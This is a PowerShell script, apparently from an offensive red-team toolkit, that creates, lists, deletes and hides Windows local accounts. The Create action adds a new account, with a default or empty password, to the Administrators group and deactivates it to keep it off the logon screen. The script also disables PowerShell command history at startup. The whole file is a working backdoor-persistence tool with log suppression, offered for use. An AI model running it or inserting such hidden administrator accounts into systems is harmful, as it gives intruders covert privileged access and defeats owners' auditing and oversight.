<#
.SYNOPSIS
   Query \ Create \ Delete Hidden User Accounts 

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: administrator privileges
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   This CmdLet Querys, Creates or Deletes windows hidden accounts.
   It also allow users to set the account 'Visible' or 'Hidden' state.

.NOTES
   Required Dependencies: Administrator Privileges on shell
   Mandatory to {Create|Delete} or set the account {Visible|Hidden} state
   The new created user account will be added to 'administrators' Group Name.

.Parameter Action
   Accepts arguments: Query, Create, Delete, Visible, Hidden

.Parameter UserName
   Accepts the User Account Name (default: SSAredTeam)

.Parameter Password
   Accepts the User Account Password (default: mys3cr3tp4ss)

.EXAMPLE
   PS C:\> Get-Help .\HiddenUser.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\HiddenUser.ps1 -Action Query
   Enumerate ALL Account's present on local system

.EXAMPLE
   PS C:\> .\HiddenUser.ps1 -Action Create -UserName "pedro"
   Creates 'pedro' hidden account without password access and 'Administrator' privs

.EXAMPLE
   PS C:\> .\HiddenUser.ps1 -Action Create -UserName "pedro" -Password "mys3cr3tp4ss"
   Creates 'pedro' hidden account with password 'mys3cr3tp4ss' and 'Administrator' privs

.EXAMPLE
   PS C:\> .\HiddenUser.ps1 -Action Visible -UserName "pedro"
   Makes 'pedro' User Account visible on logon screen

.EXAMPLE
   PS C:\> .\HiddenUser.ps1 -Action Hidden -UserName "pedro"
   Makes 'pedro' User Account Hidden on logon screen (default)

.EXAMPLE
   PS C:\> .\HiddenUser.ps1 -Action Delete -UserName "pedro"
   Deletes 'pedro' hidden|visible account

.INPUTS
   None. You cannot pipe objects into HiddenUser.ps1

.OUTPUTS
   Enabled Name               LastLogon           PasswordLastSet     PasswordRequired
   ------- ----               ---------           ---------------     ----------------
   False   Administrador                                                          True
   False   Convidado                                                             False
   False   DefaultAccount                                                        False
    True   pedro              20/03/2021 01:50:09 01/03/2021 19:53:46             True
   False   WDAGUtilityAccount                     01/03/2021 18:58:42             True

#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$UserName="false",
   [string]$Password="false",
   [string]$Action="Query"
)


## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($Action -ieq "Query"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate user accounts {active|inactive}

   .NOTES
      Required Dependencies: none
      This function works under 'UserLand' privs

   .EXAMPLE
      PS C:\> .\HiddenUser.ps1 -Action Query
      Enumerate ALL Account's present in local system

   .EXAMPLE
      PS C:\> .\HiddenUser.ps1 -Action Query -UserName "SSAredTeam"
      Display detailed information about -UserName [ name ] account

   .OUTPUTS
      Enabled Name               LastLogon           PasswordLastSet     PasswordRequired
      ------- ----               ---------           ---------------     ----------------
      False   Administrador                                                          True
      False   Convidado                                                             False
      False   DefaultAccount                                                        False
       True   pedro              20/03/2021 01:50:09 01/03/2021 19:53:46             True
      False   WDAGUtilityAccount                     01/03/2021 18:58:42             True

   #>

   Write-Host ""
   If($UserName -ieq "false"){

      $UserName = "*" ## Enum ALL account's
      Get-LocalUser $UserName -EA SilentlyContinue |
         Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table

   }Else{## Display Detailed Information about the sellected account
   
      ## Make sure user account exists before go any further
      $CheckAccount = Get-LocalUser $UserName -EA SilentlyContinue
      If($CheckAccount){## Account Name found

         Get-LocalUser $UserName -EA SilentlyContinue |
            Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table

      }Else{## Account Name NOT found

         Write-Host "`n`n[error] '$UserName' Account Not found in $Env:COMPUTERNAME!`n`n" -ForegroundColor Red -BackgroundColor Black

      }

   }


}ElseIf($Action -ieq "Create"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create Hidden user account 

   .NOTES
      Required Dependencies: Administrator Privileges on shell
      This function add's created account to Administrators Group

   .EXAMPLE
      PS C:\> .\HiddenUser.ps1 -Action Create -UserName "SSAredTeam"
      Create 'SSAredTeam' Hidden User Account without password access

   .EXAMPLE
      PS C:\> .\HiddenUser.ps1 -Action Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss"
      Create 'SSAredTeam' Hidden User Account with 'mys3cr3tp4ss' login password

   .OUTPUTS
      Enabled Name       LastLogon PasswordLastSet     PasswordRequired
      ------- ----       --------- ---------------     ----------------
        False SSAredTeam           25/03/2021 18:51:28             True

   #>

   Write-Host ""
   ## Make sure we have the rigth privileges before continue any further
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
   If(-not($IsClientAdmin)){## Non Administrator privileges found
   
      Write-Host "`n`n[error] Administrator privileges required on shell!`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @HiddenUser
      
   }

   ## Set default values in case user skip it
   If(-not($UserName) -or $UserName -ieq "false"){
   
       $UserName = "SSAredTeam"
       
   }

   ## Make sure user account to create does NOT exist
   $CheckAccount = Get-LocalUser $UserName -EA SilentlyContinue
   If($CheckAccount){## [error] User Account found!
   
      Write-Host "`n`n[error] $UserName Account allready exists in $Env:COMPUTERNAME!`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @HiddenUser
      
   }

   If(-not($Password) -or $Password -ieq "false"){
   
       ## [cmd] net user $UserName /add|Out-Null
       New-LocalUser "$UserName" -NoPassword|Out-Null
   
   }Else{## Account with password access

      ## $SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
      ## New-LocalUser "$UserName" -Password $SecurePassword|Out-Null
      net user $UserName $Password /add|Out-Null
   
   }

   ## Add created account to Administrators group
   $GetGroupsNames = net localgroup | Select-String -Pattern 'Admin' | Select -First 1
   $AdminGroupName = $GetGroupsNames -replace "\*","" ## Administradores|Administrators
   If($AdminGroupName){## Admin Group Name found!
   
      Add-LocalGroupMember -Group "$AdminGroupName" -Member "$UserName"
      If(-not($LASTEXITCODE -eq 0)){## Failed to add created account to 'administrators' Group

         Write-Host "`n`n[error] fail to add '$UserName' account to '$AdminGroupName' Group!`n`n" -ForegroundColor Red -BackgroundColor Black

      }
      
   }Else{## Admin Group Name NOT found!

      Write-Host "`n`n[error] fail to add '$UserName' account to 'Administrators' Group!`n`n" -ForegroundColor Red -BackgroundColor Black

   }

   ## De-Activate account { hidden }
   net user $UserName /active:no|Out-Null
   Get-LocalUser $UserName -EA SilentlyContinue |
      Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table


}ElseIf($Action -ieq "Delete"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete User Account {active|inactive}

   .NOTES
      Required Dependencies: Administrator Privileges on shell
      This CmdLet prevents the deletion of 'system' account's {administrator|Guest}

   .EXAMPLE
      PS C:\> .\HiddenUser.ps1 -Action Delete -UserName "SSAredTeam"
      Delete 'SSAredTeam' hidden user account

   .OUTPUTS
      Enabled Name               LastLogon           PasswordLastSet     PasswordRequired
      ------- ----               ---------           ---------------     ----------------
      False   Administrador                                                          True
      False   Convidado                                                             False
      False   DefaultAccount                                                        False
       True   pedro              20/03/2021 01:50:09 01/03/2021 19:53:46             True
      False   WDAGUtilityAccount                     01/03/2021 18:58:42             True

   #>

   Write-Host ""
   ## Make sure we have the rigth privileges before continue any further
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
   If(-not($IsClientAdmin)){## Non Administrator privileges found
   
      Write-Host "`n`n[error] Administrator privileges required on shell!`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @HiddenUser
      
   }
   
   ## Make sure we are NOT deleting an 'system' account
   # System: Administador|Administadores|Guests|Guest|Convidado|Convidados
   $GetGroupsNames = net localgroup | Select-String -Pattern 'Admin' | Select -First 1
   $AdminGroupName = $GetGroupsNames -replace "\*","" -replace 'es$',''  ## Administador
   $GuestAccChecks = net localgroup | Select-String -Pattern '(Convidados|Guests)' | Select -First 1
   If($GuestAccChecks -iMatch 'Convidados' -or $GuestAccChecks -iMatch 'Guests'){
      $GuestAccChecks = $GuestAccChecks -replace "\*","" -replace 's$','' ## Convidado|Guest
   }

   If($UserName -ieq "$AdminGroupName" -or $UserName -ieq "$guestaccchecks"){
   
      Write-Host "`n`n[error] '$UserName' its an 'system' mandatory account!`n`n" -ForegroundColor Red -BackgroundColor Black   
      exit ## Exit @HiddenUser
      
   }
    
   ## Make sure user account to delete exists before go any further
   $CheckAccount = Get-LocalUser $UserName -EA SilentlyContinue
   If($CheckAccount){## Account Name found
   
      Remove-LocalUser -Name "$UserName"|Out-Null
      ## [cmd] net user $UserName /DELETE|Out-Null
      Get-LocalUser * | Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table
         
   }Else{## Account Name NOT found
   
      Write-Host "`n`n[error] '$UserName' Account Not found in $Env:COMPUTERNAME!`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @HiddenUser
      
   }

}ElseIf($Action -ieq "Visible" -or $Action -ieq "Hidden"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Make existing User Account {Visible|Hidden}

   .NOTES
      Required Dependencies: Administrator Privileges on shell
      Required Dependencies: User account must exist to be modify!

   .EXAMPLE
      PS C:\> .\HiddenUser.ps1 -Action Visible -UserName "SSAredTeam"
      Makes 'SSAredTeam' hidden user account visible on logon screen

   .EXAMPLE
      PS C:\> .\HiddenUser.ps1 -Action Hidden -UserName "SSAredTeam"
      Makes 'SSAredTeam' hidden user account Hidden on logon screen

   .OUTPUTS
      Enabled Name               LastLogon PasswordLastSet     PasswordRequired
      ------- ----               --------- ---------------     ----------------
         True SSAredTeam                   01/03/2021 18:58:42             True
   #>

   Write-Host ""
   ## Make sure we have the rigth privileges before continue any further
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
   If(-not($IsClientAdmin)){## Non Administrator privileges found
   
      Write-Host "`n`n[error] Administrator privileges required on shell!`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @HiddenUser
      
   }

   ## Config account visibility state
   If($Action -ieq "Visible"){$cmdline = "yes"}Else{$cmdline = "no"}

   ## Make sure user account to manipulate exists before go any further
   $CheckAccount = Get-LocalUser $UserName -EA SilentlyContinue
   If($CheckAccount){## Account Name found
   
      net user $UserName /active:${cmdline}|Out-Null
      Get-LocalUser $UserName |
         Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table
         
   }Else{## Account Name NOT found
   
      Write-Host "`n`n[error] '$UserName' Account Not found in $Env:COMPUTERNAME!" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @HiddenUser
   }

Write-Host ""
}